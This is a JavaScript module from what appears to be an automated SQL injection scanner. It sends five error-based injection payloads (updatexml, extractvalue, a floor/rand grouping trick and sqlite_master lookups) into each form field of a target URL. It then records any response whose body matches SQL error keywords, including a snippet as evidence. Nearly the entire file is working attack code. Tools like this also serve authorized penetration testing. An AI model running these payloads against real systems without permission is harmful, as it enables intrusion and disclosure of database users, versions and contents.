// scanner/engine/engine-error.js
const axios = require('axios');

async function testErrorBased(url, method = 'POST', headers = {}, fields = []) {
  const results = [];

  const errorPayloads = [
    "' AND updatexml(1,concat(0x3a,user()),1)-- ",
    "' AND extractvalue(1, concat(0x7e,(SELECT database())))-- ",
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@version), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)-- ",
    "' AND (SELECT NULL FROM dual WHERE database() LIKE '%')-- ",
    "' AND (SELECT name FROM sqlite_master WHERE type='table')-- "
  ];

  for (const field of fields) {
    for (const payload of errorPayloads) {
      const data = {};
      data[field] = payload;

      try {
        const response = await axios({
          method,
          url,
          headers,
          data,
          timeout: 7000
        });

        const body = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
        if (/error|sql|updatexml|extractvalue|near|syntax/i.test(body)) {
          results.push({
            engine: 'error-based',
            field,
            payload,
            status: response.status,
            evidence: body.slice(0, 300)
          });
        }
      } catch (err) {
        results.push({
          engine: 'error-based',
          field,
          payload,
          error: err.message
        });
      }
    }
  }

  return results;
}

module.exports = testErrorBased;
